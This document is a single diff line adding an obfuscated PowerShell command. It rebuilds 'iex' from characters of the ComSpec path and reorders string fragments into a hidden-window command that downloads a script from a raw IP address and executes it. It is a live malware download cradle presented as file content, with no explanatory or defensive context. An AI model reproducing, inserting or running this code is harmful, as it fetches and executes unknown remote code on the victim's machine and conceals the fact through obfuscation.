@@ -1,0 +1,1 @@
+﻿.( $ENV:cOmSpEc[4,15,25]-jOin'') ( ((("{18}{6}{17}{19}{3}{4}{5}{10}{20}{7}{8}{16}{11}{2}{0}{15}{1}{14}{13}{21}{9}{12}" -f 'ient)','wn','ebcl','op ','-w',' ','xe','b','jec','80','hidden -c','net.w','/a875))za7','p://93.175.232.53','loadstring(875htt','.do','t ',' -','powershell.e','n',' za7IEX ((new-o',':'))-REpLacE 'za7',[cHar]34  -cRePLAce'875',[cHar]39) ) 
